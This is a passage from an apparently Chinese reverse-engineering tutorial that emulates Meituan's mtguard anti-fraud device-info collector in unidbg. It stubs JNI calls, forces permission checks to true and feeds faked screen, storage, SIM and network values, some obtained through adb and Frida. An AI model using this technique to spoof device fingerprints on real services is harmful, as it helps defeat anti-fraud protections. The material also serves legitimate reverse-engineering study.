com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/lang/StringBuilder-&gt;toString()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, dvmObject.getValue().toString());&#125;</code></pre><p>运行，终于跑通了</p><pre><code class="language-shell">[*] getEvironmentInfoExtra:0|0|0|-|0|0|0.8|0|0|0|</code></pre><p>这个结果和上一个结果一样，有很多 0，看起来就像是收集信息，然后使用 <strong>|</strong> 作为分割并拼接起来。</p><h3 id="六、getExtrarnalEquipmentInfo"><a href="#六、getExtrarnalEquipmentInfo" class="headerlink" title="六、getExtrarnalEquipmentInfo"></a>六、getExtrarnalEquipmentInfo</h3><p>新增对它的call</p><pre><code class="language-Java">    public static void main(String[] args) &#123;        TEST4 test4 = new TEST4();        System.out.println(&quot;[*] getEnvironmentInfo:&quot; + test4.getEnvironmentInfo());        System.out.println(&quot;[*] getEvironmentInfoExtra:&quot; + test4.getEnvironmentInfoExtra());        System.out.println(&quot;[*] getExtrernalEquipmentInfo:&quot; + test4.getExternalEquipmentInfo());    &#125;    public String getEnvironmentInfo() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getEnvironmentInfo()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;    public String getEnvironmentInfoExtra() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getEnvironmentInfoExtra()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;    public String getExternalEquipmentInfo() &#123;        String result = SIUACollector.callJniMethodObject(emulator, &quot;getExternalEquipmentInfo()Ljava/lang/String;&quot;).getValue().toString();        return result;    &#125;</code></pre><p>运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/Context-&gt;getApplicationContext()Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:210)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>简单占位</p><pre><code class="language-Java">case &quot;android/content/Context-&gt;getApplicationContext()Landroid/content/Context;&quot;:&#123;    return vm.resolveClass(&quot;android/content/Context&quot;).newObject(null);&#125;</code></pre><p>运行，继续报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/content/Context-&gt;getSystemService(Ljava/lang/String;)Ljava/lang/Object;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:210)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>系统服务是 Android 所提供的一项重要服务，在 JNI 补环境中出现频率相当高，Unidbg 对它做了专门处理，可以参考 AbstractJni，其中有如下片段</p><pre><code class="language-Java">            case &quot;android/app/Application-&gt;getSystemService(Ljava/lang/String;)Ljava/lang/Object;&quot;: &#123;                StringObject serviceName = vaList.getObjectArg(0);                assert serviceName != null;                return new SystemService(vm, serviceName.getValue());            &#125;</code></pre><p>抄一下</p><pre><code class="language-Java">case &quot;android/content/Context-&gt;getSystemService(Ljava/lang/String;)Ljava/lang/Object;&quot;:&#123;    StringObject serviceName = vaList.getObjectArg(0);    assert serviceName != null;    return new SystemService(vm, serviceName.getValue());&#125;</code></pre><p>继续运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isPermissionGranted(Ljava/lang/String;Landroid/content/Context;)Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:230)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)at com.github.unidbg.linux.android.dvm.DvmMethod.callBooleanMethodA(DvmMethod.java:124)</code></pre><p>isPermissionGranted 具体什么作用？根据函数名、函数实现可以看出，就是大致用来检测 App 是否有某项权限。</p><pre><code class="language-Java">        private boolean isPermissionGranted(String str, Context context) &#123;            Object[] objArr = &#123;str, context&#125;;            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            return PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;a0fa204a6b6694d5ab23ad161583721d&quot;, RobustBitConfig.DEFAULT_VALUE) ? ((Boolean) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;a0fa204a6b6694d5ab23ad161583721d&quot;)).booleanValue() : Permissions.isPermissionGranted(str, context);        &#125;</code></pre><pre><code class="language-Java">    public static boolean isPermissionGranted(String str, Context context) &#123;        Object[] objArr = &#123;str, context&#125;;        ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;        if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;44db3326d9c0bbe25993cff8771e9a68&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;            return ((Boolean) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;44db3326d9c0bbe25993cff8771e9a68&quot;)).booleanValue();        &#125;        try &#123;            return Build.VERSION.SDK_INT &gt;= 23 ? context.getApplicationContext().getApplicationInfo().targetSdkVersion &gt;= 23 ? context.checkSelfPermission(str) == 0 : PermissionChecker.a(context, str) == 0 : PermissionChecker.a(context, str) == 0;        &#125; catch (Throwable th) &#123;            c.a(th);            DFPLog.error(th);            return false;        &#125;    &#125;</code></pre><p>打印一下当前调用的参数。</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isPermissionGranted(Ljava/lang/String;Landroid/content/Context;)Z&quot;:&#123;    String permissionName = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;[!] check permission:&quot;+permissionName);&#125;</code></pre><p>运行查看输出</p><pre><code>[!] check permission: android.permission.READ_PHONE_STATE</code></pre><p>这个权限很明显了，就是 “允许访问电话状态权限”，直接返回 True</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isPermissionGranted(Ljava/lang/String;Landroid/content/Context;)Z&quot;:&#123;    String permissionName = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;check permission:&quot;+permissionName);    if(permissionName.equals(&quot;android.permission.READ_PHONE_STATE&quot;))&#123;        return true;    &#125;else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build$VERSION-&gt;SDK_INT:Iat com.github.unidbg.linux.android.dvm.AbstractJni.getStaticIntField(AbstractJni.java:136)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticIntField(AbstractJni.java:128)at com.github.unidbg.linux.android.dvm.DvmField.getStaticIntField(DvmField.java:121)at com.github.unidbg.linux.android.dvm.DalvikVM$147.handle(DalvikVM.java:2358)</code></pre><p>这里是在获取 SDK 的版本，直接返回目前常见的 Android 15，即 35</p><pre><code class="language-Java">    @Override    public int getStaticIntField(BaseVM vm, DvmClass dvmClass, String signature) &#123;        switch (signature) &#123;            case &quot;android/os/Build$VERSION-&gt;SDK_INT:I&quot;: &#123;                return 35;            &#125;        &#125;        return super.getStaticIntField(vm, dvmClass, signature);    &#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;checkBuildAttribute(Ljava/lang/String;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:208)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>先打印一下参数，看看是啥</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;checkBuildAttribute(Ljava/lang/String;)Ljava/lang/String;&quot;: &#123;                String arg = vaList.getObjectArg(0).getValue().toString();                System.out.println(&quot;[!] checkBuildAttribute: &quot; + arg);            &#125;</code></pre><p>运行，但是这个参数不知道是啥</p><pre><code class="language-shell">[!] checkBuildAttribute: -</code></pre><p>所以还是 <strong>Jadx</strong> 看看伪代码吧</p><pre><code class="language-Java">        private String checkBuildAttribute(String str) &#123;            Object[] objArr = &#123;str&#125;;            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            return PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;3b097946787cf593049f918e4d2f8a4e&quot;, RobustBitConfig.DEFAULT_VALUE) ? (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;3b097946787cf593049f918e4d2f8a4e&quot;) : (TextUtils.isEmpty(str) || str.equalsIgnoreCase(&quot;unknown&quot;)) ? CommonConstant.Symbol.MINUS : str;        &#125;</code></pre><p>前面就是常规的热修复判断，后面就是做简单的字符串校验，若字符串为空或是 <code>&quot;unknown&quot;</code>，返回 <code>&quot;-&quot;</code>；否则返回字符串本身。</p><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;checkBuildAttribute(Ljava/lang/String;)Ljava/lang/String;&quot;:&#123;    String arg = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;checkBuildAttribute:&quot;+arg);    return new StringObject(vm, arg.isEmpty() || arg.equalsIgnoreCase(&quot;unknown&quot;) ? &quot;-&quot; : arg);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/view/WindowManager-&gt;getDefaultDisplay()Landroid/view/Display;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:213)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>这是一个 Android 对象，按照前面所说的补环境原则直接处理。</p><pre><code class="language-Java">case &quot;android/view/WindowManager-&gt;getDefaultDisplay()Landroid/view/Display;&quot;:&#123;    return vm.resolveClass(&quot;android/view/Display&quot;).newObject(null);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/view/Display-&gt;getHeight()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:273)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)at com.github.unidbg.linux.android.dvm.DvmMethod.callIntMethodA(DvmMethod.java:134)</code></pre><p>又是 Android FrameWork 层的 API，拷打了下 chatGPT，它和 <strong>getWidth</strong></p><p>一起用于获取屏幕的宽高。对于这类基本设备信息，完全可以通过 ADB 获取。</p><pre><code class="language-shell">└─Δ adb shell wm sizePhysical size: 1080x2400</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;android/view/Display-&gt;getHeight()I&quot;:&#123;    return 2400;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/lang/StringBuilder-&gt;append(I)Ljava/lang/StringBuilder;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:416)at com.dianping.NBridge.callObjectMethodV(NBridge.java:139)</code></pre><p>补环境</p><pre><code class="language-Java">            case &quot;java/lang/StringBuilder-&gt;append(I)Ljava/lang/StringBuilder;&quot;: &#123;                int value = vaList.getIntArg(0); // 直接取 int                ((StringBuilder) dvmObject.getValue()).append(value); // 自动转成字符串拼接                return dvmObject; // append 返回 this            &#125;</code></pre><p>继续补环境</p><pre><code class="language-Java">case &quot;java/lang/StringBuilder-&gt;append(C)Ljava/lang/StringBuilder;&quot;:&#123;    return ProxyDvmObject.createObject(vm, ((StringBuilder) dvmObject.getValue()).append((char)vaList.getIntArg(0)));&#125;</code></pre><p>遇到新报错，刚刚补过高，现在补的是宽</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/view/Display-&gt;getWidth()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:279)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)</code></pre><p>依旧是根据上面 adb 获取的值进行补</p><pre><code class="language-Java">case &quot;android/view/Display-&gt;getWidth()I&quot;:&#123;    return 1080;&#125;</code></pre><p>运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getTotalInternalMemorySize()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:219)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p><strong>getTotalInternalMemorySize</strong> 这个函数名就很清晰直白，再看看代码逻辑验证一下</p><pre><code class="language-Java">        private String getTotalInternalMemorySize() &#123;            Object[] objArr = new Object[0];            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;838e88ccfd19d138e498f2d967b7d987&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;                return (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;838e88ccfd19d138e498f2d967b7d987&quot;);            &#125;            StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());            return fileSize(statFs.getBlockCount() * statFs.getBlockSize());        &#125;</code></pre><p>这个逻辑就很简单，<strong>Environment.getDataDirectory()</strong> 就是 data 文件夹，它是存储的根目录。<strong>StatFs</strong> 底层对应于 stat 结构体</p><pre><code class="language-c++">struct stat &#123;    dev_t     st_dev;     /* ID of device containing file */    ino_t     st_ino;     /* inode number */    mode_t    st_mode;    /* protection */    nlink_t   st_nlink;   /* number of hard links */    uid_t     st_uid;     /* user ID of owner */    gid_t     st_gid;     /* group ID of owner */    dev_t     st_rdev;    /* device ID (if special file) */    off_t     st_size;    /* total size, in bytes */    blksize_t st_blksize; /* blocksize for file system I/O */    blkcnt_t  st_blocks;  /* number of 512B blocks allocated */    time_t    st_atime;   /* time of last access */    time_t    st_mtime;   /* time of last modification */    time_t    st_ctime;   /* time of last status change */&#125;;</code></pre><p>这里是 <strong>st_blksize * st_blocks</strong>，返回 data 文件夹的实际大小，单位是 <strong>Bit</strong>。在 Native 代码实现也经常是这个逻辑。最后看 <strong>fileSize</strong> 函数的实现，它将很大的比特值转为更为直观和合适的 <strong>MB</strong> 和 <strong>GB</strong>。</p><pre><code class="language-Java">        private String fileSize(long j) &#123;            Object[] objArr = &#123;new Long(j)&#125;;            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;6a69a740a4e2f5966b7d134666227a92&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;                return (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;6a69a740a4e2f5966b7d134666227a92&quot;);            &#125;            StringBuilder sb = new StringBuilder();            String str = &quot;&quot;;            if (j &gt;= 1024) &#123;                str = &quot;KB&quot;;                j /= 1024;                if (j &gt;= 1024) &#123;                    str = &quot;MB&quot;;                    j /= 1024;                    if (j &gt;= 1024) &#123;                        str = &quot;GB&quot;;                        j /= 1024;                    &#125;                &#125;            &#125;            sb.append(j);            sb.append(str);            return sb.toString();        &#125;</code></pre><p>这里直接通过 Frida Call 获取这个值。</p><pre><code class="language-js">function callSIUACollector() &#123;  setTimeout(function () &#123;    Java.perform(function () &#123;      const ActivityThread = Java.use(&quot;android.app.ActivityThread&quot;);      let context = ActivityThread.currentApplication().getApplicationContext();      const ContextClass = Java.use(&quot;android.content.Context&quot;);      const ctx = Java.cast(context, ContextClass);      let SIUACollector = Java.use(        &quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;      );      // 传context创建实例      let instance = SIUACollector.$new(ctx);      let result = instance.getTotalInternalMemorySize();      console.log(&quot;ret: &quot; + result);    &#125;);  &#125;, 3000);&#125;callSIUACollector();</code></pre><p>我的测试机跑下来是 226GB</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getTotalInternalMemorySize()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;226GB&quot;);&#125;</code></pre><p>运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getTotalExternalMemorySize()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:222)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>那么看看 <strong>getTotalExternalMemorySize</strong> 具体实现</p><pre><code class="language-Java">        private String getTotalExternalMemorySize() &#123;            Object[] objArr = new Object[0];            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;522b1633753f28d5eb161a6c3ff3faa1&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;                return (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;522b1633753f28d5eb161a6c3ff3faa1&quot;);            &#125;            try &#123;                if (!Environment.getExternalStorageState().equals(&quot;mounted&quot;)) &#123;                    return &quot;&quot;;                &#125;                StatFs statFs = new StatFs(Environment.getExternalStorageDirectory().getPath());                return fileSize(statFs.getBlockCount() * statFs.getBlockSize());            &#125; catch (Exception e) &#123;                c.a(e);                MTGuardLog.error(e);                return &quot;&quot;;            &#125;        &#125;</code></pre><p>这段代码实现了 <strong>获取外部存储总容量</strong> 的功能，<strong>Environment.getExternalStorageDirectory().getPath()</strong> 获取外部存储的路径，同样的采取 Frida call 一下</p><pre><code class="language-js">function callSIUACollector() &#123;  setTimeout(function () &#123;    Java.perform(function () &#123;      const ActivityThread = Java.use(&quot;android.app.ActivityThread&quot;);      let context = ActivityThread.currentApplication().getApplicationContext();      const ContextClass = Java.use(&quot;android.content.Context&quot;);      const ctx = Java.cast(context, ContextClass);      let SIUACollector = Java.use(        &quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;      );      // 传context创建实例      let instance = SIUACollector.$new(ctx);      let result = instance.getTotalExternalMemorySize();      console.log(&quot;ret: &quot; + result);    &#125;);  &#125;, 3000);&#125;callSIUACollector();</code></pre><p>结果如下</p><pre><code class="language-shell">ret: 226GB</code></pre><p>同样是 226GB </p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getTotalExternalMemorySize()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;226GB&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">[!] check permission: android.permission.ACCESS_WIFI_STATE[11:18:19 847]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987096, svcNumber=0x123, PC=unidbg@0xfffe02c4, LR=RX@0x1203d9a3[libmtguard.so]0x3d9a3, syscall=nulljava.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isPermissionGranted(Ljava/lang/String;Landroid/content/Context;)Zat com.test4.TEST4.callBooleanMethodV(TEST4.java:251)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)at com.github.unidbg.linux.android.dvm.DvmMethod.callBooleanMethodA(DvmMethod.java:124)</code></pre><p>这是在确认是否有访问 WiFi 状态的权限，直接选择返回 True。</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;isPermissionGranted(Ljava/lang/String;Landroid/content/Context;)Z&quot;:&#123;    String permissionName = vaList.getObjectArg(0).getValue().toString();    System.out.println(&quot;check permission:&quot;+permissionName);    if(permissionName.equals(&quot;android.permission.READ_PHONE_STATE&quot;))&#123;        return true;    &#125;else if(permissionName.equals(&quot;android.permission.ACCESS_WIFI_STATE&quot;))&#123;        return true;    &#125;    else &#123;        throw new UnsupportedOperationException(signature);    &#125;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/text/TextUtils-&gt;isEmpty(Ljava/lang/CharSequence;)Zat com.github.unidbg.linux.android.dvm.AbstractJni.callStaticBooleanMethodV(AbstractJni.java:191)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticBooleanMethodV(AbstractJni.java:186)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticBooleanMethodV(DvmMethod.java:184)</code></pre><p>这是 Android FrameWork 中处理字符串的工具类，这种工具函数往往不会很复杂，在 <a href="http://aospxref.com/android-9.0.0_r61/search?project=frameworks&full=&defs=&refs=&path=TextUtils.java&hist=&type=&xrd=&nn=1">AOSP</a> 中找一下它的实现。(但是目前 Google 官方好像关闭了它的访问)</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250813112300853.png" alt="image-20250813112300853"></p><p>找到具体实现</p><pre><code class="language-Java">public static boolean isEmpty(CharSequence str) &#123;    return str == null || str.length() == 0;&#125;</code></pre><p>复写一下</p><pre><code class="language-Java">@Overridepublic boolean callStaticBooleanMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;android/text/TextUtils-&gt;isEmpty(Ljava/lang/CharSequence;)Z&quot;:&#123;            String str = vaList.getObjectArg(0).getValue().toString();            return str == null || str.length() == 0;        &#125;    &#125;    return super.callStaticBooleanMethodV(vm, dvmClass, signature, vaList);&#125;</code></pre><p>继续运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/telephony/TelephonyManager-&gt;getSimOperator()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:225)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>又是 Android FrameWork 里的函数，Google 找篇文章看下，比如<a href="https://zhuanlan.zhihu.com/p/87602090">这篇</a>，得知这是在获取运行商相关的信息。</p><p>同样可以通过 ADB 获取得到相关信息</p><pre><code class="language-shell">└─Δ adb shellares:/ $ getprop | grep sim[gsm.sim.num.simlock]: [][gsm.sim.preiccid_0]: [][gsm.sim.preiccid_1]: [][gsm.sim.state]: [ABSENT,ABSENT][gsm.sim1.num.simlock]: [][gsm.sim1.type]: [][gsm.sim2.type]: [][persist.log.tag.IsimFileHandler]: [I][persist.log.tag.IsimRecords]: [I][persist.log.tag.MtkCsimFH]: [I][persist.log.tag.MtkIsimFH]: [I][persist.log.tag.MtkUsimFH]: [I][persist.log.tag.VsimAdaptor]: [I][persist.radio.multisim.config]: [dsds][persist.vendor.radio.msimmode]: [dsds][persist.vendor.radio.sim.mode]: [3][persist.vendor.radio.simswitch]: [1][ril.csim.mlpl_mspl_ver0]: [,][ril.csim.mlpl_mspl_ver1]: [,][ro.mtk_perf_simple_start_win]: [1][ro.vendor.mtk_external_sim_only_slots]: [0][ro.vendor.mtk_external_sim_support]: [1][ro.vendor.mtk_sim_card_onoff]: [3][ro.vendor.radio.max.multisim]: [dsds][ro.vendor.sim_me_lock_mode]: [3][vendor.gsm.external.sim.connected]: [0][vendor.gsm.external.sim.timeout]: [13,13][vendor.gsm.modem.vsim.capability]: [2,2][vendor.gsm.sim.extended.format1]: [0][vendor.gsm.sim.extended.format2]: [0][vendor.gsm.sim.retry.pin1]: [][vendor.gsm.sim.retry.pin1.2]: [][vendor.gsm.sim.retry.pin2]: [][vendor.gsm.sim.retry.pin2.2]: [][vendor.gsm.sim.retry.puk1]: [][vendor.gsm.sim.retry.puk1.2]: [][vendor.gsm.sim.retry.puk2]: [][vendor.gsm.sim.retry.puk2.2]: [][vendor.gsm.sim.slot.lock.card.valid]: [2][vendor.gsm.sim.slot.lock.card.valid.2]: [2][vendor.gsm.sim.slot.lock.policy]: [3][vendor.gsm.sim.slot.lock.service.capability]: [4][vendor.gsm.sim.slot.lock.service.capability.2]: [4][vendor.gsm.sim.slot.lock.state]: [0][vendor.ril.sim.onoff.support]: [1][vendor.ril.sim.uicc.applications.enable.state]: [0][vendor.ril.sim.uicc.applications.enable.state.2]: [0][vendor.ril.simswitch.no_reset_support]: [1][vendor.ril.simswitch.tpluswsupport]: [1]</code></pre><p>但是我的测试机上没插卡，也看不太懂，直接试一下返回一个空字符串，不行再伪造一个。</p><p>而如果测试机是有卡的话，是可以采集到值的，返回的值是由 MCC + MNC 组成。</p><p><code>MCC</code>由国际电信联盟 ITU 在全世界范围内统一分配和管理，唯一识别移动用户所属的国家，共3位，中国为460。</p><p><code>MNC</code>用于识别移动用户所归属的移动通信网，2~3位。中国移动系统使用 00、02、04、07，中国联通系统使用 01、06、09，中国电信使用 03、05、11，中国铁通系统使用 20 。</p><pre><code class="language-Java">case &quot;android/telephony/TelephonyManager-&gt;getSimOperator()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;&quot;);&#125;</code></pre><p>继续运行，发现还真过了，然后报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getAccessSubType()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:226)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)at com.github.unidbg.linux.android.dvm.DalvikVM$33.handle(DalvikVM.java:578)</code></pre><p>去 <strong>Jadx</strong> 中看看伪代码实现</p><pre><code class="language-Java">        @SuppressLint(&#123;&quot;MissingPermission&quot;&#125;)        private String getAccessSubType() &#123;            Object[] objArr = new Object[0];            ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;            if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;4e473c1fae47c0bf65e6f819cd3eaf7c&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;                return (String) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;4e473c1fae47c0bf65e6f819cd3eaf7c&quot;);            &#125;            Context context = this.mContext;            if (context == null) &#123;                return StringUtil.NULL;            &#125;            if (!isPermissionGranted(&quot;android.permission.ACCESS_NETWORK_STATE&quot;, context)) &#123;                return CommonConstant.Symbol.MINUS;            &#125;            ConnectivityManager connectivityManager = (ConnectivityManager) this.mContext.getApplicationContext().getSystemService(&quot;connectivity&quot;);            NetworkInfo activeNetworkInfo = connectivityManager != null ? connectivityManager.getActiveNetworkInfo() : null;            if (activeNetworkInfo == null) &#123;                return StringUtil.NULL;            &#125;            if (activeNetworkInfo.getType() == 1) &#123;                return &quot;wifi&quot;;            &#125;            if (activeNetworkInfo.getType() != 0) &#123;                return &quot;&quot;;            &#125;            int subtype = activeNetworkInfo.getSubtype();            return (subtype == 4 || subtype == 1 || subtype == 2) ? &quot;2G&quot; : (subtype == 3 || subtype == 8 || subtype == 6 || subtype == 5 || subtype == 12) ? &quot;3G&quot; : subtype == 13 ? &quot;4G&quot; : &quot;&quot;;        &#125;</code></pre><p>看起来是在获取网络类型</p><pre><code class="language-Java">//检测当前的网络模式，可以是：wifi/2G/3G/4Gcase &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getAccessSubType()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;wifi&quot;);&#125;</code></pre><p>继续运行，得到结果</p><pre><code class="language-shell">[*] getExternalEquipmentInfo:-|-|-|2400421080|226GB|226GB|AQmac|-|wifi|</code></pre><h3 id="七、getHWEquipmentInfo"><a href="#七、getHWEquipmentInfo" class="headerlink" title="七、getHWEquipmentInfo"></a>七、getHWEquipmentInfo</h3><p>首先先初始化发起调用看看报什么错</p><pre><code class="language-Java">public String getHWEquipmentInfo()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getHWEquipmentInfo()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getCpuInfoType()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:140)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>去 <strong>Jadx</strong> 中查看对应方法的伪代码</p><pre><code class="language-Java">private String getCpuInfoType()&#123;       Closeable uCloseable;       Throwable throwable;       String str1;       int i = 0;       Object[] objArray = new Object[i];       ChangeQuickRedirect changeQuickR = NBridge$SIUACollector.changeQuickRedirect;       if (PatchProxy.isSupport(objArray, this, changeQuickR, false, 